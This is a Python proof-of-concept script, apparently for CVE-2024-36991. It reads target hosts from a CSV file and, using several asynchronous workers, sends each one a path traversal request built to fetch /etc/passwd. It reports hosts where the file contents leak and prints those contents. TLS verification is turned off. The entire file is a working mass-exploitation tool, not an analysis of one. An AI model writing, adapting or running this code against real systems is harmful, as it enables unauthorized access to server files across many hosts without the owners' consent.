import asyncio
import csv
import time
from functools import wraps

import httpx

from acetylate_poc.schemas.cli_args import ArgOptionDetails, CommandArgsSchema
from acetylate_poc.utils.script import build_argparse

TIMEOUT = 5.0

def timeit(func):
    @wraps(func)
    async def wrapper(*args, **kwargs):
        start_time = time.monotonic()
        result = await func(*args, **kwargs)
        end_time = time.monotonic()
        print(f"Execution time: {end_time - start_time:.2f} seconds")
        return result
    return wrapper

def csv_file_iterator(filename):
    with open(filename, 'r', encoding="utf-8-sig") as file:
        reader = csv.DictReader(file)
        for row in reader:
            yield row

def fix_host(host, protocol, ip, port):
    if not host:
        host = f"{protocol}://{ip}" if port in ["80", "443"] else f"{protocol}://{ip}:{port}"
    if not ("http" in host or "https" in host):
        host = f"{protocol}://{host}" if port in ["80", "443"] else f"{protocol}://{host}:{port}"
    return host

async def exploit(client: httpx.AsyncClient, target):
    host = target.get("host")
    protocol = target.get("protocol")
    ip = target.get("ip")
    port = target.get("port")

    host = fix_host(host, protocol, ip, port)
    payload = "/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd"

    url = f"{host}{payload}"
    result = None
    try:
        # 设置请求超时
        response = await client.get(url, timeout=TIMEOUT)
        response.raise_for_status()
        if "admin:" in response.text:
            result = f"[+] [{response.status_code}]\t[{host}]\n{response.text}\n"
        else:
            result = f"[-] [{response.status_code}]\t[{host}]\n{response.text}\n"
    except httpx.HTTPStatusError as exc:
        result = f"[-] [{exc.response.status_code}]\t[{host}] {exc}"
    except httpx.TimeoutException:
        result = f"[-] [Timeout]\t[{host}] Request timed out."
    except httpx.NetworkError as exc:
        result = f"[-] [Network Error]\t[{host}] {exc}"
    except Exception as exc:
        result = f"[-] [Error]\t[{host}] {exc}"
    finally:
        return result  # noqa: B012


async def request_task(task_name, queue):
    async with httpx.AsyncClient(verify=False) as client:  # noqa: S501
        while True:
            target = await queue.get()
            if target:
                result = await exploit(client, target)
                print(f"[{task_name}] {result}")
            queue.task_done()

@timeit
async def main(csv_file, queue_size=300, task_num=7):
    queue = asyncio.Queue(queue_size)

    tasks = []
    zfill_length = len(str(task_num))
    for i in range(task_num):
        task = asyncio.create_task(request_task(f'task-{i:0{zfill_length}d}', queue))
        tasks.append(task)

    for target in csv_file_iterator(csv_file):
        queue.put_nowait(target)

        if queue.full():
            await queue.join()

    if not queue.empty():
        await queue.join()

    for task in tasks:
        task.cancel()
    await asyncio.gather(*tasks, return_exceptions=True)


if __name__ == '__main__':

    args = build_argparse(CommandArgsSchema(
        description=(
            "CVE-2024-36991"
        ),
        required=["file"],
        options={
            "file": ArgOptionDetails(
                short_name="f",
                arg_type="str",
                arg_help="csv file"
            )
        }
    )).parse_args(["--help"])
    if args.file:
        asyncio.run(main(args.file))